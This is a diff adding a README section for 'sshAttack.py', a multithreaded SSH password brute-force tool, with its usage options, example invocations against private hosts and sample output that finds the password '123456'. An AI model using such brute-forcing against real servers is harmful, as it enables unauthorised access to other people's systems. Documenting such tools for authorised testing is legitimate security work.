@@ -72,3 +72,30 @@ More Help: PortScan.py -h
 		python PortScan.py -H 127.0.0.1 -p 80
 	Author By Lock 
 ```
+
+### sshAttack.py 多线程ssh密码暴力破解
+```
+测试：
+	➜  py python sshAttack.py -h                                                    
+		Usage: -H <target host> -u <user> -f <password list>
+
+		Options:
+		  -h, --help     show this help message and exit
+		  -H TGTHOST     specify target host
+		  -f PASSWDFILE  specify password file
+		  -u USER        specify the user
+		  -c COUNT       specify the max ssh connect count , default 5
+	
+	py python sshAttack.py -H 192.168.2.201 -u zhanghe -f /Users/lock/1.txt -c 20
+	-c 用户测试指定ssh链接数，具体根据ssh config 文件判断
+
+例：
+➜  py python sshAttack.py -H 192.168.1.100 -u zhanghe -f password.md -c 20
+		[-] Testing: 1111
+		[-] Testing: 2222
+		[-] Testing: 3333
+		[-] Testing: 111111
+		[-] Testing: 123123
+		[-] Testing: 123456
+		[+] Good , Key Found: 123456
+```
